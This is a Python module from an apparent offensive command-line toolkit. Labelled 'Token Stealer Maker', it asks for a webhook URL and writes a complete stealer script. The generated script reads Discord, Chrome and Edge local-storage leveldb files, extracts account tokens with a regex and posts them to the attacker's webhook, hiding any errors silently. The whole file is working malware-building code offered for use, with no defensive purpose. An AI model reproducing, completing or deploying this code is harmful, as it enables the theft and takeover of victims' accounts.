# language: Python, file: modules/token_stealer.py
# Generates a token-grabber payload template (Discord local storage / leveldb paths)

from pathlib import Path
from rich.console import Console
from rich.prompt import Prompt
from rich.syntax import Syntax

from aethelcli.webhook import report_module

console = Console()

TEMPLATE = '''\
# generated by aethelcli · Token Stealer Maker
# language: Python 3
import os, re, json, requests, base64
from pathlib import Path

WEBHOOK = "{webhook}"

PATHS = [
    Path(os.getenv("APPDATA", "")) / "Discord" / "Local Storage" / "leveldb",
    Path(os.getenv("APPDATA", "")) / "discordcanary" / "Local Storage" / "leveldb",
    Path(os.getenv("APPDATA", "")) / "discordptb" / "Local Storage" / "leveldb",
    Path(os.getenv("LOCALAPPDATA", "")) / "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb",
    Path(os.getenv("LOCALAPPDATA", "")) / "Microsoft" / "Edge" / "User Data" / "Default" / "Local Storage" / "leveldb",
]

TOKEN_RE = re.compile(r"[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}|mfa\\.[\\w-]{{84}}")

def grab():
    tokens = set()
    for p in PATHS:
        if not p.exists():
            continue
        for f in p.glob("*"):
            if f.suffix not in (".ldb", ".log"):
                continue
            try:
                data = f.read_bytes().decode("utf-8", errors="ignore")
                tokens.update(TOKEN_RE.findall(data))
            except Exception:
                pass
    return list(tokens)

def send(tokens):
    if not tokens:
        return
    content = "```\\n" + "\\n".join(tokens) + "\\n```"
    try:
        requests.post(WEBHOOK, json={{"content": content}}, timeout=10)
    except Exception:
        pass

if __name__ == "__main__":
    send(grab())
'''

def run() -> None:
    console.print("[bold cyan]▸ Token Stealer Maker[/]")
    wh = Prompt.ask("  webhook URL for the generated stealer")
    out = Prompt.ask("  output file", default="stealer.py")

    report_module("Token Stealer Maker", {"output": out})

    code = TEMPLATE.format(webhook=wh)
    Path(out).write_text(code, encoding="utf-8")
    console.print(f"[green]wrote {out}[/]")
    console.print(Syntax(code[:600] + "\n# ...", "python", theme="monokai", line_numbers=False))
    console.print()
